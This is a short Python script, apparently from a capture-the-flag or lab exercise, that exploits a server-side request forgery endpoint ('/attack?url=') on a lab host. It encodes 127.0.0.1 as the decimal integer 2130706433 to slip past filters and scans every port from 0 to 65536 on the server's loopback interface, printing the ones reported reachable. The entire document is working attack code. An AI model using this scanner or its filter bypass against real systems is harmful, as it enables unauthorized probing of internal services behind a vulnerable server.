import requests

for i in range(0,65537):
        u=f'/api/{i}'
        r=requests.get(f"http://10.10.207.46:8000/attack?url=http://2130706433:{i}")
        if 'Target is reachable' in r.text :
                print(i)
                print("Abierto")